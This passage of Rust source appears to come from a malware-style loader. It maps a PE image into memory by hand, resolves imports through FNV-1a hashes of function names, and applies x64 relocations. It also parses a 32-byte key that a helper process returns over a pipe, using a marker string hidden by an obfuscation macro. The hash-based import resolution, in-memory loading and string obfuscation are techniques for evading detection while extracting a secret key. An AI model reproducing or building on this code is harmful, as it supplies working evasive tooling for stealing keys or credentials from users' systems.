        if oft == 0 && name_rva == 0 && ft == 0 {
            return Some(());
        }
        let dll_name = cstr(image, name_rva)?.to_owned();
        let int = if oft != 0 { oft } else { ft };
        let mut i = 0usize;
        for _ in 0..4096 {
            let entry = rd_u64(image, int.checked_add(i.checked_mul(8)?)?)?;
            if entry == 0 {
                break;
            }
            if entry & (1 << 63) != 0 {
                return None; // ordinal import; the helper has none
            }
            let name = cstr(image, (entry as usize).checked_add(2)?)?.to_owned();
            let addr = unsafe { resolve(&dll_name, fnv1a(&name)) };
            if addr == 0 {
                return None;
            }
            let at = ft.checked_add(i.checked_mul(8)?)?;
            image
                .get_mut(at..at.checked_add(8)?)?
                .copy_from_slice(&(addr as u64).to_le_bytes());
            i += 1;
        }
        d = d.checked_add(20)?;
    }
    None
}

/// Apply IMAGE_REL_BASED_DIR64 fixups for loading at a non-preferred base.
fn apply_relocations(image: &mut [u8], reloc_rva: u32, reloc_size: u32, delta: u64) -> Option<()> {
    let mut off = reloc_rva as usize;
    let end = off.checked_add(reloc_size as usize)?;
    while off.checked_add(8)? <= end {
        let page = rd_u32(image, off)? as usize;
        let block_size = rd_u32(image, off.checked_add(4)?)? as usize;
        if block_size < 8 {
            return None;
        }
        for i in 0..(block_size - 8) / 2 {
            let e = rd_u16(image, off.checked_add(8)?.checked_add(i.checked_mul(2)?)?)?;
            match e >> 12 {
                0 => {} // ABSOLUTE padding
                10 => {
                    let loc = page.checked_add((e & 0x0fff) as usize)?;
                    let cur = rd_u64(image, loc)?;
                    image
                        .get_mut(loc..loc.checked_add(8)?)?
                        .copy_from_slice(&cur.wrapping_add(delta).to_le_bytes());
                }
                _ => {} // x64 images only use DIR64
            }
        }
        off = off.checked_add(block_size)?;
    }
    Some(())
}

// ---------------------------------------------------------------------------
// Output parsing
// ---------------------------------------------------------------------------

/// The helper emits exactly `KEYOK:<64 lowercase hex>\n`; anything else on
/// the pipe is rejected outright (no substring scanning of arbitrary data).
fn parse_hex_key(out: &[u8]) -> Option<Vec<u8>> {
    let magic = crate::obf!("KEYOK:");
    let body = out.strip_prefix(magic.as_bytes())?;
    let hex = body.strip_suffix(b"\n").unwrap_or(body);
    if hex.len() != 64 {
        return None;
    }
    let mut key = Vec::with_capacity(32);
    for i in 0..32 {
        let hi = hex_val(*hex.get(2 * i)?)?;
        let lo = hex_val(*hex.get(2 * i + 1)?)?;
        key.push(hi << 4 | lo);
    }
    Some(key)
}

fn hex_val(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}
